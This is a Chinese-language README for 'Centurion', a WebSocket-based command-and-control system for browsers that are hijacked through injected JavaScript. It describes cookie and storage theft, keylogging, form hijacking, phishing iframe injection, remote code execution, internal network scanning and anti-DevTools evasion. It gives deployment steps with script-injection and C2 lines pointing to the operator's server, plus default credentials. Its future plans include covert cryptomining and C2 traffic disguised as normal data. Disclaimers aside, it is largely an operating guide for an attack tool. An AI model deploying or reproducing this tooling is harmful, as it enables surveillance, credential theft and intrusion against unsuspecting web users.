# Centurion - XSS-WebSocket-C2 远程浏览器控制系统

## 项目概述

Centurion 是一个基于 WebSocket 的远程浏览器控制系统，通过在目标网页中注入 JavaScript Agent 来实现对受害者浏览器的远程监控和控制。

**⚠️ 警告：本项目仅供安全研究和授权渗透测试使用，未经授权使用属于违法行为。**

## 主要功能

### 1. 远程控制功能
- **实时 WebSocket 通信**：攻击者与受害者之间建立持久化连接
- **多目标管理**：支持同时控制多个受害者浏览器
- **命令投递**：可向指定受害者或广播命令到所有在线目标

### 2. 信息收集
- **浏览器指纹**：User-Agent、平台信息、插件列表
- **URL 和 Referrer**：当前页面地址和来源
- **Cookie 窃取**：获取目标站点的 Cookie 数据
- **存储数据窃取**：
  - localStorage / sessionStorage
  - IndexedDB 数据库枚举
  - Cache Storage（Service Worker 缓存）
  - Web SQL（如果支持）
  - 存储配额信息

### 3. 键盘记录（Keylogger）
- 实时捕获输入框和文本域的键盘输入
- 自动缓冲和定时上传（每 10 秒或 20 个按键）
- 支持动态启用/禁用

### 4. 表单劫持
- 拦截所有表单提交事件
- 窃取表单数据（用户名、密码等敏感信息）
- 不影响原始表单提交流程

### 5. 钓鱼页面注入
- 在受害者浏览器中注入全屏 iframe 钓鱼页面
- 自动捕获钓鱼页面中的表单提交数据
- 支持跨域钓鱼（通过 postMessage）

### 6. 远程代码执行
- 在受害者浏览器中执行任意 JavaScript 代码
- 返回执行结果到控制端

### 7. 内网扫描
- 利用受害者浏览器扫描内网 IP 和端口
- 支持 IP 范围、CIDR 格式
- 支持端口范围扫描

### 8. 文件下发
- 向受害者浏览器推送文件（Base64 编码）
- 自动触发文件下载

### 9. 表单自动提交
- 远程控制受害者浏览器提交指定表单
- 支持 GET/POST 方法
- 返回提交响应内容

### 10. 链接劫持
- 自动劫持页面中的所有链接点击
- 在跳转的新页面中自动注入 Agent 脚本
- 实现持久化控制

### 11. 反调试保护
- 检测开发者工具（DevTools）打开状态
- DevTools 打开时自动停止所有恶意活动
- DevTools 关闭后自动恢复连接

### 12. 心跳保活
- 每 15 秒发送心跳包保持连接
- 断线自动重连（指数退避，最长 60 秒）

## 技术架构

### 后端（Python + FastAPI）
- **框架**：FastAPI + Uvicorn
- **协议**：WebSocket over TLS (WSS)
- **端口**：8443（HTTPS）
- **认证**：Cookie 基础认证

### 前端
- **控制面板**：Bootstrap 5 + 原生 JavaScript
- **Agent 脚本**：纯 JavaScript，无依赖
- **通信协议**：WebSocket（角色：attacker / victim）

## 配置说明

### 1. 环境要求
```bash
Python 3.7+
```

### 2. 依赖安装
```bash
pip install -r requirements.txt
```

依赖包：
- `fastapi` - Web 框架
- `uvicorn[standard]` - ASGI 服务器

### 3. 生成 SSL 证书
```bash
chmod +x gen-cert.sh
./gen-cert.sh
```

这将在 `certs/` 目录下生成自签名证书：
- `cert.pem` - SSL 证书
- `key.pem` - 私钥

### 4. 启动服务
```bash
chmod +x start.sh
./start.sh
```

服务将在 `https://0.0.0.0:8443` 启动

### 5. 登录凭据
- **控制面板地址**：`https://<your-domain>:8443/control`
- **默认账号**：`admin`
- **默认密码**：`123456`
- **认证 Cookie**：`peeko_auth=fe94cff87220ffbb52a8169cd4fd93df`

### 6. Agent 部署
在目标网页中注入以下代码：
```html
<script src="https://<your-domain>:8443/min.js"></script>
```

**重要配置**：需要修改 `min.js` 中的服务器地址（两处）：
- **第 48 行**：WebSocket 连接地址
  ```javascript
  window.socket = new WebSocket("wss://<your-domain>:8443/ws");
  ```
- **第 431 行**：Agent 脚本地址（用于链接劫持持久化）
  ```javascript
  const agentScript = `<script src="https://<your-domain>:8443/min.js"></script>`;
  ```

将 `<your-domain>` 替换为你的实际服务器域名或 IP 地址。

## 主要用途

### 合法用途（需授权）
1. **安全研究**：研究浏览器安全机制和 XSS 攻击向量
2. **渗透测试**：在授权的红队演练中测试 Web 应用安全性
3. **安全培训**：演示 XSS 和浏览器劫持的危害
4. **漏洞验证**：验证 XSS 漏洞的实际影响范围

### 典型攻击场景（仅限授权测试）
1. **XSS 持久化**：通过存储型 XSS 注入 min.js 脚本
2. **水坑攻击**：在目标群体常访问的网站植入脚本
3. **钓鱼攻击**：结合社会工程学诱导用户访问恶意页面
4. **内网渗透**：利用受害者浏览器作为跳板扫描内网

## 使用流程

### 1. 服务端部署
```bash
# 安装依赖
pip install -r requirements.txt

# 生成证书
./gen-cert.sh

# 启动服务
./start.sh
```

### 2. 修改 Agent 配置
编辑 `min.js` 文件，将以下两处的 `<your-domain>` 替换为你的服务器地址：
- 第 48 行：WebSocket 连接
- 第 431 行：脚本自引用

### 3. 注入 Agent
在目标页面中注入：
```html
<script src="https://your-server:8443/min.js"></script>
```

### 4. 登录控制面板
访问 `https://your-server:8443/control`，使用默认凭据登录。

### 5. 控制受害者
- 在控制面板中选择受害者
- 发送命令或启用功能（键盘记录、表单劫持等）
- 查看实时日志和收集的数据


### 未来功能计划：
1. 收集剪切板内容
2. 文件上传到服务器
3. 混淆js
4. 增加目标ip的地理位置信息
5. 通信的websocket信息加密
6. 利用受害者 CPU 进行挖矿（可选功能）
7. 流量伪装：WebSocket 消息伪装成正常业务数据（如心跳包伪装成统计上报）
有更好的想法也欢迎push，有问题提交issue。


**再次提醒：请勿将本工具用于任何非法用途！**

